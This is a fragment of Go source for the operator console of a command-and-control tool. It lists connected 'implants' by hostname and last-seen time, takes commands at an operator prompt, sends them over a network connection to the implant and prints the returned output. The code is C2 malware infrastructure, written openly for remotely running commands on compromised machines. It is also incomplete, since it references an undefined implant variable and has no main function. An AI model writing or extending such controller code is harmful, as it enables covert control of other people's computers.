package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
)

var pendingCommand string
var outputDone = make(chan bool)

func listImplants() {
	status := "inactive"
	if implant.Active {
		status = "active"
	}

	fmt.Printf("[+] ID:%s Status:%s Last Seen:%s\n", implant.Hostname, status, implant.LastSeen.Format("15:04:05"))
}
func getUserInput() {
	input := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("[operator]> ")
		command, err := input.ReadString('\n')
		if err != nil {
			log.Println("[-] Error reading input:", err)
			return
		}

		command = strings.TrimSpace(command)
		if command == "implants" {
			listImplants()
			continue
		}

		pendingCommand = strings.TrimSpace(command)
		<-outputDone // Receving a value from channel i believe
	}
}

func sendCommands(conn net.Conn) {

	_, err := conn.Write([]byte(pendingCommand))
	if err != nil {
		log.Println("[-] Error sending command", err)
		return
	}

	fmt.Println("\n[+] Command sent successfully")
}

func receiveOutput(reader *bufio.Reader) {
	response := bufio.NewReader(reader)
	for {
		output, err := response.ReadString('\n')
		if err != nil {
			return
		}
		if strings.TrimSpace(output) == "END_OF_OUTPUT" {
			outputDone <- true
			return
		}
		fmt.Print(output)
	}
}
